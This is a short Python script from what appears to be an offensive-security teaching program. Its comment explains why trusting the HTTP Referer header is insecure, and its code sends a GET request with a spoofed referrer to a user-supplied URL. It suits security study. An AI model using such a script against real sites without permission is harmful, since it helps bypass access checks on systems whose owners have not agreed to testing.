# Offensive Security Software
# SSE Program
# Attack: HTTP Referrer Spoofing
# Date: January 31, 2016
# Description:  An interesting header of HTTP that a browser sends with every
# request is the referrer.  It contains the URL this request is originating
# from.  Some web applications use it as a security feature to figure out if
# the request comes from an internal network and concludes that the user
# must therefore be logged in.  That's a really bad idea as the referrer
# can be freely spoofed.

import sys
import httplib2

if len(sys.argv) < 2:
    print sys.argv[0] + ": <url>"
    sys.exit(1)

headers = {'Referer': 'http://www.brentchambers.net'}
webclient = httplib2.Http()
response, content = webclient.request(sys.argv[1],
                                      'GET',
                                      headers=headers)
print content
